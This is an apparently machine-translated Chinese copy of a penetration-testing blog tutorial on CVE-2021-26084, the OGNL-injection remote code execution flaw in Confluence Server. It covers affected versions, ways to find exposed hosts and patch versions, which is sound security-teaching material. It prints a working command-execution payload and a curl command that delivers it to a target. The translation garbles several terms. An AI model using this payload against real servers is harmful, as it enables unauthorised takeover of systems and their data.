<html>
<head>
<title>How to detect and exploit CVE-2021-26084, the Confluence Server RCE | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>如何检测和利用CVE-2021-26084，合流服务器RCE | Pentest-Tools.com</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/detect-exploit-cve-2021-26084-confluence-server-rce#2022-07-05T15:24:39.000Z">https://pentest-tools.com/blog/detect-exploit-cve-2021-26084-confluence-server-rce#2022-07-05T15:24:39.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>像攻击者一样思考是正确的思维方式，可以帮助您更好地应对RCE漏洞的惊人增长。</p><p>作为一个圣灵降临者，你比任何人都清楚这一点。您也最适合利用您的经验和专业知识在恶意行为者之前检测暴露的关键资产。</p><p>为了帮助您帮助他人，在这本包含检测策略和缓解方法的实用指南中，我将探讨跨Linux和Windows的Atlassian Confluence服务器中的一个严重RCE漏洞。</p><p>让我们直入主题吧！</p><h2 id="what-is-confluence"><strong>什么是合流？</strong></h2><p><strong> Confluence </strong>是一款基于网络的企业协作软件，旨在存储、共享和处理不同的项目。它由<strong>亚特兰蒂斯</strong>开发，用Java <strong>编写。</strong>虽然没有关于客户数量的公开数据，但我们可以有把握地假设，全球有成千上万的人将Confluence作为他们日常工作流程的一部分。</p><p>这也是我们决定针对这一特定漏洞推出测试指南的原因之一。</p><p><img src="../Images/09c4282bb693a1c827024cb3941b3449.png" alt="" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWV4cGxvaXQtY3ZlLTIwMjEtMjYwODQtY29uZmx1ZW5jZS1zZXJ2ZXItcmNlL2ppcmEtY29uZmx1ZW5jZS5wbmc=?s=d9988ac0c8f20ae5f5d4b5df9c7f5ee2"/></p><h2 id="how-the-confluence-server-rce-vuln-works"><strong>合流服务器RCE·沃恩如何工作</strong></h2><p>CVE-2021-26084基于对象图导航语言(OGNL)注入。我们为<a href="https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts"> OGNL注射</a>提供了完整的指南，这样你就可以在需要的时候深入了解。</p><p>这个特殊的Confluence Server漏洞允许攻击者注入OGNL代码，并在运行该服务器的用户权限下执行该代码。如果启用了注册或创建新用户选项，则未经验证的用户可以向端点发送恶意负载，并为Confluence服务器创建新条目，如<strong>/pages/Create page-enter variables . action</strong>，从而触发可导致远程代码执行的漏洞。</p><p>可从恶意负载中提到的“query string”html标记中检索已执行代码的输出。</p><h2 id="vulnerable-confluence-server-versions"><strong>易受攻击的合流服务器版本</strong></h2><p>该安全问题被追踪为<a target="_blank" rel="external nofollow noopener noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26084"> CVE-2021-26084 </a>，影响以下版本的Confluence服务器:</p><ul><li><p>6.13.23版之前的所有版本，</p></li><li><p>从6.14.0版到7.4.11版</p></li><li><p>从7.5.0版到7.11.6版</p></li><li><p>从7.12.0版到7.12.5版</p></li></ul><p>根据公司<a target="_blank" rel="external nofollow noopener noreferrer" href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">安全发布</a>。</p><h2 id="business-impact-of-cve-2021-26084"><strong>CVE的业务影响-2021-26084 </strong></h2><p>当成功利用时，该漏洞允许未经验证的攻击者获得<strong>对目标</strong> t的完全控制，危及Confluence服务器使用的所有服务和数据库，并在内部网络中进行枢纽分析。</p><h2 id="how-to-find-targets-vulnerable-to-cve-2021-26084-in-your-environment"><strong>如何在您的环境中找到易受CVE-2021-26084攻击的目标</strong></h2><p>为了帮助您的组织和客户避免恶意黑客利用该漏洞造成的巨大损失，我将展示三种方法来查找可能受其影响的实例。</p><h3 id="using-shodan"><strong>使用Shodan </strong></h3><p>使用带有<strong><em>X-Confluence-Request-Time</em></strong>cookie的Shodan搜索引擎将为有动机的攻击者揭示更多潜在目标:</p><p><img src="../Images/92fcaf8734bbc20b17c632425d19788f.png" alt="" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWV4cGxvaXQtY3ZlLTIwMjEtMjYwODQtY29uZmx1ZW5jZS1zZXJ2ZXItcmNlL3Z1bG5lcmFibGUtdGFyZ2V0cy1vbi1zaG9kYW4ucG5n?s=7ca43bc2fdb7b694165b4142a357e4bd"/></p><p>在写这篇文章的时候，Shodan透露了至少有<strong> 12，342个潜在易受攻击的服务器</strong>。</p><h3 id="using-google-dorks"><strong>使用谷歌呆子</strong></h3><p>您还可以使用Google Dorks通过以下搜索查询来找出Confluence主机:</p><p><strong><em>inurl:/合流/页数</em> </strong></p><p><img src="../Images/8691a5e6d94f74d054413609aa1107da.png" alt="" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWV4cGxvaXQtY3ZlLTIwMjEtMjYwODQtY29uZmx1ZW5jZS1zZXJ2ZXItcmNlL3NlYXJjaC1xdWVyeS11c2luZy1nb29nbGUtZG9ya3MucG5n?s=1a3e0369150fd84080b2edb86884ecce"/></p><h3 id="using-publicwww"><strong>使用PublicWWW </strong></h3><p>PublicWWW 是一个搜索引擎，你可以用它根据源代码内容、回复头、cookies和使用的技术来搜索网站。您可以在这个搜索引擎中对Shodan查询使用我刚才提到的相同cookie:</p><p><strong><em>X-合流-请求-时间</em> </strong></p><p><img src="../Images/cab35754b74d0480e7ef1c1a131750f6.png" alt="" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWV4cGxvaXQtY3ZlLTIwMjEtMjYwODQtY29uZmx1ZW5jZS1zZXJ2ZXItcmNlL3Nob2Rhbi1xdWVyeS1vbi1wdWJsaWN3d3cucG5n?s=bb0a2796d2ca5fc85a2a19671a62a429"/></p><p>找到目标后，就该验证哪些目标实际上是可利用的了，这样您就可以提供准确的测试报告，帮助以最有效的方式指导补救。</p><h2 id="how-to-manually-exploit-cve-2021-26084-in-ethical-hacking-engagements"><strong>如何在道德黑客活动中手动利用CVE-2021-26084</strong></h2><p>为了利用CVE-2021-26084 ，你需要创建一个简单的有效载荷，如下所示，并将其保存到一个文件中:</p><div class="content-highlight"><pre class="code-block"><code>queryString="aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin =java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022&lt;Command&gt;\\u0022);var p = newjava.lang.ProcessBuilder(); if(isWin){p.command(\\u0022powershell.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true);var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream());var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; varoutput = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output =output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027”</code></pre></div><p>有效负载中使用的命令可以用于Linux和Windows操作系统，例如–ls–Linux命令和–dir–Windows命令有效负载看起来像:</p><div class="content-highlight"><pre class="code-block"><code>queryString="aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin =java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022ls\\u0022);var p = newjava.lang.ProcessBuilder(); if(isWin){p.command(\\u0022powershell.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true);var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream());var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; varoutput = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output =output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027”</code></pre></div><p>对于<strong> ls </strong> Linux命令和:</p><div class="content-highlight"><pre class="code-block"><code>queryString="aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin =java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022dir\\u0022);var p = newjava.lang.ProcessBuilder(); if(isWin){p.command(\\u0022powershell.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true);var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream());var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; varoutput = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output =output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027”</code></pre></div><p>对于<strong> dir </strong> Windows命令</p><p>使用以下命令，您可以触发RCE:</p><div class="content-highlight"><pre class="code-block"><code>curl -XPOST -d @&lt;payload_file&gt; http(s)://&lt;Target_ip&gt;:&lt;port&gt;/pages/createpage-entervariables.action?SpaceKey=x</code></pre></div><p>注入命令的输出可能反映在先前在有效负载构造中使用的queryString HTML资源中。</p><p>如果你想尝试另一种更快的开发策略，看看Pentest-Tools.com吧。</p><h2 id="how-to-mitigate-cve-2021-26084"><strong>如何减轻CVE-2021-26084 </strong></h2><p>我们建议在您的环境中应用可用的补丁，因为Atlassian已经发布了针对CVE-2021-26084 的<a target="_blank" rel="external nofollow noopener noreferrer" href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">补丁。</a></p><div class="flex flex-col"><div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6"><div class="inline-block min-w-full py-2 align-middle sm:px-6"><div class="border border-gray-200 bg-white overflow-hidden shadow sm:rounded-lg"><table class="min-w-full divide-y divide-gray-200"><thead><tr><td colspan="1" rowspan="1"><strong>产品构建</strong></td><td colspan="1" rowspan="1"><strong>固定版本</strong></td></tr></thead><tr><td colspan="1" rowspan="1">Confluence 6.13.x及6.13之前的所有版本</td><td colspan="1" rowspan="1">6.13.23</td></tr><tr><td colspan="1" rowspan="1">Confluence 7.4.x及7.4.0之前的所有版本</td><td colspan="1" rowspan="1">7.4.11</td></tr><tr><td colspan="1" rowspan="1">Confluence 7.11.x及7.4.0之前的所有版本</td><td colspan="1" rowspan="1">7.11.6</td></tr><tr><td colspan="1" rowspan="1">Confluence 7.12.x及7.4.0之前的所有版本</td><td colspan="1" rowspan="1">7.12.5</td></tr></table></div></div></div></div><p>随着RCE漏洞到处出现，你需要所有你能得到的帮助来控制局面，并确保你的同事或客户得到准确的报告。从我们的道德黑客之家到您的邮箱，直接获取新的测试指南！</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>